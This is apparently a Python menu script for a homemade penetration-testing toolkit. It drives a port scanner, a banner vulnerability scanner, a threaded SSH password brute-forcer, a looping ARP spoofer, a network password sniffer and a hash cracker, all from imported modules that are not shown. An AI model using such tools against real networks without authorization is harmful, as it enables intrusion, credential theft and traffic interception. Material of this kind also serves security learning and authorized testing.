import os
import threading
import time
from os import path
from termcolor import colored
from portScanner import checkIP, scan1, scanRange
import portScanner_vulscan as vul
import sshbrutethreaded as ssh
from PasswordCracker import crack
from arpspoofer2 import getMacAddress, spoof
import scapy
from passSniffer import sniff, pkt_parser


def portScannerf():
    print(colored('PortScanner  ', on_color='on_green'))

    try:
        pr, tr, tmr = False, False, False
        timer, ports, targets, portsArray = str(), str(), str(), list()
        while not tr:  # Keep repeating the question until user inputs are valid

            targets = str(input(colored('\n[+] Enter Target/s To Scan(split multiple targets with): ', 'green'))).strip(
                ' ')
            if len(targets.strip(' ')) > 0:
                for ipAddress in targets.split(','):  # for every ip address in the inputted targets target
                    if checkIP(ipAddress)[0]:  # check if its a valid ip
                        tr = True
                    else:  # if not print the error and ask the question again, by breaking the loop
                        print(colored('[0_o] ' + ipAddress + ' not an ip address', 'on_red'))
                        tr = False
                        break

        while not pr:  # port is not right i.e pr
            ports = input(colored('[+] Enter Port/s To Scan(multiple ports with - for range or , for specific ports): ',
                                  'green')).strip()
            if '-' in ports:
                for port in ports.split('-'):
                    if port.isdigit():
                        pr = True
                    else:
                        pr = False
                        print(colored('[0_o] invalid port number specified: ' + port, on_color='on_red'))
                        break  # break from the for loop
            else:  # single or specific ports
                for port in ports.split(','):
                    if port.isdigit():
                        pr = True
                    else:
                        pr = False
                        print(colored('[0_o] invalid port number specified: ' + port, on_color='on_red'))
                        break  # ends the iteration once an error is found

        while not tmr:
            timer = input(colored('[+] Enter timeout time in seconds i.e 5 = fives seconds ', 'green')).strip(' ')
            if timer.isdigit():
                tmr = True
            else:
                print(colored('[0_o] Invalid time number specified:' + timer, on_color='on_red'))
                tmr = False

        if '-' in ports:  # if a range of port
            for port in ports.split('-'):
                portsArray.append(int(port))
                # makes sure the range is in order from lowest to highest
                portsArray.sort()

            for ipAddress in targets.split(','):
                scanRange(ipAddress, portsArray[0], portsArray[1], timer)
        else:
            for port in ports.split(','):
                portsArray.append(int(port.strip(' ')))

            for ipAddress in targets.split(','):
                scan1(ipAddress, portsArray, timer)

    except KeyboardInterrupt:
        print('bye.')
        exit(0)


def vulScan():
    print(colored('_____VULNERABILITY SCANNER____', on_color='on_cyan'))
    try:
        right_choice = [False, False, False, False]
        portIsRange = bool()
        portArray = []

        while not right_choice[0]:  # while the targets input is invalid as the question
            targets = str(
                input(colored('\n[+] Enter Target/s To Scan(split multiple targets with ,): ', 'green'))).strip(' ')
            right_choice[0] = True
            for ip_add in targets.split(','):
                if not checkIP(ip_add)[1]:
                    right_choice[0] = False
                    print(colored(ip_add, on_color='on_red', attrs=['underline']) + colored(' not an ipaddress',
                                                                                            color='red'))
                    break

        while not right_choice[1]:  # while the port input is invalid ask the question
            ports = input(
                colored('\n[+] Enter Port/s To Scan(multiple ports with - for range or , for specific ports): ',
                        'green')).strip(' ')
            if '-' not in ports:  # if it not a range i.e specific port(s)
                portIsRange = False
                for port in ports.split(','):
                    if port.isdigit():  # check if each port they've entered is an whole number
                        portArray.append(int(port))  # add it it to the array
                        right_choice[1] = True
                    else:  # if a input isn't a number, ask the the question again
                        right_choice[1] = False
                        print(
                            colored(port, on_color='on_red', attrs=['underline']) +
                            colored(' not a valid port number', color='red'))
                        break
            else:  # if its a range
                portIsRange = True
                for port in ports.split('-'):
                    if port.isdigit():  # check if each ports they've entered is an whole number
                        portArray.append(int(port))
                        right_choice[1] = True
                        portArray.sort()  # makes sure the range is in order from lowest to highest
                    else:
                        right_choice[1] = False
                        print(colored(port, color='grey', attrs=['underline']) +
                              colored(' not a valid port number', color='red'))
                        break

        while not right_choice[2]:
            timer = input(colored('\n[+] Enter timeout time in seconds ', 'green')).strip(' ')
            if timer.isdigit():
                right_choice[2] = True
            else:
                right_choice[2] = False

        while not right_choice[3]:
            vul_File = input(colored('\n[+] Input file with banners to search for', 'green'))
            if path.isfile(vul_File):
                right_choice[3] = True
            else:
                print(colored('File Not Found !\n', color='red'))

        for ip_add in targets.split(','):
            if portIsRange:
                # a list of banners and their ports
                bannerAndPort = vul.scanRange(ip_add, portArray[0], portArray[1], int(timer))
            else:
                bannerAndPort = vul.scan1(ip_add, portArray, int(timer))

            if len(bannerAndPort) > 0:
                bannerArray = []
                portArray.clear()  # reusing the array
                for x in range(len(bannerAndPort)):
                    bannerArray.append(bannerAndPort[x][0])
                    portArray.append(bannerAndPort[x][1])

                with open(vul_File, 'r') as file:
                    for line in file.readlines():
                        if line.strip().lower() in bannerArray:
                            print(
                                colored('[!!] VULNERABLE BANNER: ', 'blue') +
                                colored(line.strip(), 'cyan', attrs=['bold', 'underline', 'reverse']) +
                                colored(' ON PORT: ', 'blue') +
                                # Gets the index of the banner in the banner array, which is the same same as the
                                # index of the port array
                                colored(str(portArray[bannerArray.index(line.strip())]), color='cyan',
                                        attrs=['bold', 'underline', 'reverse'])
                            )

                view_all = input(colored('Would you like it see all banners found ?', 'yellow'))
                if 'y' in view_all.lower():
                    for x in range(len(bannerArray)):
                        print(colored('\nBanner: ', 'green') +
                              colored(bannerArray[x], 'yellow', attrs=['underline', 'bold']) +
                              colored('  on Port: ', color='green') +
                              colored(portArray[x], 'yellow', attrs=['underline', 'bold']))
                else:
                    pass
            else:
                print(colored('No Banners Found', 'red'))
                continue

    except KeyboardInterrupt:
        pass


def sshBruteForcer():
    try:
        print('_____SSH BRUTEFORCER____\n')
        host = input('[+] Target Address: ')
        username = input('[+] SSH Username: ')
        input_file = input('[+] Passwords File: ')
        print('\n')

        def file(password_file):
            f = None
            try:  # check if the file exist
                f = open(password_file, 'r')
            except IOError:
                print("File not accessible")
            else:  # if the file exists
                print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')
                with f as passwords:
                    for line in passwords.readlines():
                        if ssh.stop_flag == 1:
                            t.join()
                            exit()
                        password = line.strip()
                        t = threading.Thread(target=ssh.sshConnection, args=(host, username, password,))
                        t.start()
                        time.sleep(0.5)
            finally:
                f.close()

        file(input_file)
    except KeyboardInterrupt:
        print('bye.')
        exit(0)


def passwordCracker():
    try:
        print('_____PASSWORD CRACKER____\n')
        hash_to_decrypt = str(input(colored('[+] Enter hash to decrypt or hashes using ",": ', color='grey')))
        fr, thr = False, False

        while not thr:
            print(colored('[+] Choose a Hash to decrypt:', color='grey', attrs=list['bold']))
            type_of_hash = str(
                input(colored('[1] SHA-1  ', on_color='on_green') + colored('[2]MD-5  ', on_color='on_blue')
                      + colored('[3]SHA-256  ', on_color='on_cyan'))
            ).strip(' ')
            if type_of_hash == "1" or type_of_hash == "2" or type_of_hash == "3":
                thr = True
                if type_of_hash == "1":
                    type_of_hash = "sha1"
                elif type_of_hash == "2":
                    type_of_hash = "md5"
                else:
                    type_of_hash = "sha256"
            else:
                pass

        while not fr:  # if file is not right
            file_path = str(input(colored('[+] Enter path to the password file: ', color='grey')))
            if not path.isfile(file_path):
                print(colored('File not found\n', 'red') + colored('Try again', color='red', attrs=['bold']))
            else:
                fr = True

    except:
        print(colored("0_o Error", 'red', attrs=['bold']))
    else:
        for each_hash in hash_to_decrypt.split(','):
            crack(type_of_hash, file_path, each_hash)


def arpSpoofer():
    print('_____ARP SPOOFER____\n')
    try:
        tip, rip = False, False
        target_ip, router_ip = str(), str()
        list_of_target_ips = list()
        while not tip:  # if theres a error in the target ip
            target_ip = input('[+] Enter Target ip): ').strip(' ')
            if ',' in target_ip:
                for ip_add in target_ip.split(','):
                    if checkIP(ip_add)[0] == ip_add:  # check if its a valid ip
                        tip = True
                    else:  # if not print ask the question again, by breaking the loop
                        print(ip_add + 'not an ip address')
                        tip = False
                        break
            if ',' not in target_ip:
                if checkIP(target_ip)[0] == target_ip:  # check if its a valid ip
                    tip = True
                else:  # if not print the error and ask the question again, by breaking the loop
                    print(target_ip + 'not an ip address')
                    tip = False

        for ips in target_ip.split(','):  # places targets in this array
            list_of_target_ips.append(ips)
        print(list_of_target_ips)
        while not rip:  # if theres a error in the target ip
            router_ip = input('[+] Enter Router ip): ').strip(' ')
            if checkIP(router_ip)[0] == router_ip:  # check if its a valid ip
                rip = True
            else:  # if not print the error and ask the question again, by breaking the loop
                print(router_ip + 'not an ip address')
                print('try again\n')
                rip = False
    except KeyboardInterrupt:
        print('\nClosing ARP Spoofer.')
        exit(0)
    else:
        try:
            list_of_target_macs = list()
            for ip in list_of_target_ips:
                list_of_target_macs.append(str(getMacAddress(ip)))

            router_mac = str(getMacAddress(router_ip))
            print(router_mac)
            print(list_of_target_macs)
        except IndexError:
            print("Mac Address of " + ip + " not found")
        except KeyboardInterrupt:
            print('bye')
        except:
            print('error connecting')
        else:
            try:
                while True:
                    for x in range(len(list_of_target_macs)):
                        print(x)
                        spoof(router_ip, list_of_target_ips[x], router_mac, list_of_target_macs[x])
                        time.sleep(
                            round(2 / len(list_of_target_macs), 2))  # ensures each ip is spoofed every to seconds

            except KeyboardInterrupt:
                print('Closing ARP Spoofer.')
                exit(0)


def passwordSniffer():
    print(colored('_____PASSWORD SNIFFER____', on_color='on_yellow'))
    print("\n")
    ir = True
    while ir:
        interface = input("Enter Interface i.e en0 or ethernet: ")  # make its user input
        try:
            print()
            sniff(iface=interface, prn=pkt_parser, store=0)
        except KeyboardInterrupt:
            print('Exiting')
            exit(0)
        except scapy.error.Scapy_Exception as e:
            if 'root' in str(e):
                print(colored("WARNING ", "red", attrs=['bold']) + colored('Not running application as Sudo!!', 'red'))
            elif 'BIOCSETIF' in str(e):
                print(colored('Not a valid interface interface', 'red'))
            else:
                print(str(e))


if __name__ == '__main__':

    if os.geteuid() == 0:
        try:
            print('\n')
            print(colored("Welcome to PENE TEST", color="grey", on_color="on_cyan", attrs=['bold', 'underline']))
            intro = True
            while intro:
                print('\n')
                opr = False
                while not opr:  # if input is invalid keep asking the question
                    print(colored('[1] PortScanner  ', on_color='on_green') +
                          colored("[2] Vulnerability Scanner", on_color='on_cyan') +
                          colored("[3] SSH Bruteforce  ", on_color='on_magenta')
                          )
                    print('-' * 65)
                    print(colored("[4] ARPSpoofer   ", on_color='on_blue') +
                          colored("[5] Password Sniffer     ", on_color='on_red', attrs=['dark']) +
                          colored("[6] Password Cracker", on_color='on_grey')
                          )
                    option = input(colored("\nChoose a number: ", attrs=["bold"])).strip(' ')

                    if option == '1':
                        opr = True
                        portScannerf()
                    elif option == '2':
                        opr = True
                        vulScan()
                    elif option == '3':
                        opr = True
                        sshBruteForcer()
                    elif option == '4':
                        opr = True
                        arpSpoofer()
                    elif option == '5':
                        opr = True
                        passwordSniffer()
                    elif option == '6':
                        opr = True
                        passwordCracker()
                    else:
                        print(colored('[0_o] Input not recognised\n', color='red', attrs=['bold']))

                if 'n' in input('\nWould you like to continue? y/n: ').lower():
                    intro = False
                    print('bye.')

        except KeyboardInterrupt:
            print('\nBye.')
    else:
        print(colored("WARNING Not running application as Root!!", "red", attrs=['bold', 'reverse']))
        exit(0)
